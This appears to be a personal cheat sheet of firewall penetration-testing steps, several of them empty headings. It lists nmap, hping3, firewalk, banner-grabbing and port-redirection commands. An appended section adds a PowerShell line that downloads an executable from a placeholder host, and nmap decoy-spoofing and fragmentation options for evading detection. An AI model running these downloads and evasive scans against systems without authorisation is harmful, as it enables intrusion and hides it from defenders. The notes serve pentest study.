Firewall Pentesting:

1. Locating the firewall
we send a packet contains TCP/UDP/ICMP payloads
tools: hping3(scans one ip) or nmap(scans multiple ip's)
hping3 is recommended, becuase it is not noisly 
```
hping3 --traceroute -T -1 $firewall_ip
```

2. traceroute
discovering the path that our packet did take to get to the destination
```
traceroute $firewall_ip // on linux
tracert $firewall_ip // on windows
```

3. Port scanning
to discover open ports and their services
-T4 / -T1 speed for scanning -T4 is very aggressive.
```
nmap -sS -p 0-1024 $firewall_ip
nmap -sT -p 0-1024 $firewall_ip
```

4.  Banner grabbing
to get information about the firewall
```
nc -nvv $firewall_ip
nmap -sV --script=banner $firewall_ip
nmap -Pn -p 80 -sV --script=banner $firewall_ip
curl -s -I $firewall_ip  | grep -ie "Server:"
telnet $firewall_ip
dmitry -b $firewall_ip
```

5. Access controls (ACL) enumeration
pentester sends different types of packet to see which packet type the firewall will block and which will allow. Here is a black-box testing. Trying different types
to determine which traffics is allowed or deny on the firewalls
tools: nmap
```
nmap -sA $firewall_ip // will send an ACK flag to the first 1024 port for testing
nmap -sF $firewall_ip // will send an FIN flag to the first 1024 port for testing
```
-> A part is open: it is listening
-> Port state is filtered: firewall has blocked the port
-> Port state is unfiltered: firewall allows traffic through this port, but the port is closed 


6. Firewall architecture:
-> RST/ACK packet: firewall rejected the packet
-> SYN/ACK packet: port is in the open state
-> No response: firewall dropped the packet
-> ICMP type 3 code 13 packets: firewall blocked the connection

```

```
7. Firewall policy

```

```

8. Firewalking
a tool to map the network devices
https://www.kali.org/tools/firewalk/?adlt=strict
```
firewalk -h 
firewalk -d $port_number -i $interface -n -p TCP/UDP $firewall_ip 8.8.8.8
```

9. Port redirection
testing if there is a port redirection
tools: fpipe or datapipe
```
fpipe -l 53 -f 80 $firewall_ip
```

10. external and internal penetration testing

```

```

11. Testing for Covert Channels
Testing if pentester can do a hidden communication connection without getting alerted 
```

```

12. HTTP tunneling

```

```

13. Identify firewall specific vulns:
misconfiguration, CVE's, vulnerable services, old vulnerable versions.
look for your firewall version on cve websites like cvedetails




-> How to download a file through powershell:
>iwr -UseBasicParsing -Uri "https://ip:port/anyname.exe" -OutFile "Any-Path-On-Machine"

-> Spoofing IP for scanning with nmap:
>nmap -sS -sV -F -D $spoofed_ip $target_ip
>nmap -sS -sV -F -D RND:3 $target_ip
-F fast scan (scan only top 100 ports)
-D RND:3 scan with 3 random ips

>nmap -sS -sV -F -f --send-eth -D RND:3 $target_ip
-f will fragment the sent packets to the lowest size (8 bytes), if you added another -f will fragment the packet to 16 bytes and so on.

>nmap -sS -sV -F -mtu 16 --send-eth -D RND:3 $target_ip
-mtu to specify a specific packet size (8 16 32 64 128 and so on)


nmap options
https://www.tutorialspoint.com/nmap-cheat-sheet?adlt=strict
